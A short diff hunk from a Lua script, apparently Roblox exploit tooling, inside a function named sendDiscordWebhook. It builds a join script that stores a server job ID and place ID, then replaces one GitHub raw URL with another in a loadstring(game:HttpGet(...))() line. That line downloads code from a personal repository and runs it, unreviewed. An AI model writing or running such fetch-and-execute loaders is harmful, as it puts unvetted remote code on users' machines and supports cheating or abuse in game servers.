@@ -393,7 +393,7 @@ local function sendDiscordWebhook(models, webhookUrl, isThirdWebhook)
     local joinScript = [[
 _G.JB = "]] .. jobId .. [["
 _G.PL = ]] .. placeId .. [[
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Brawl575/Leak/refs/heads/main/Giga"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/trinx/refs/heads/main/hop"))()
 ]]
 
     if playerCount <= 3 then
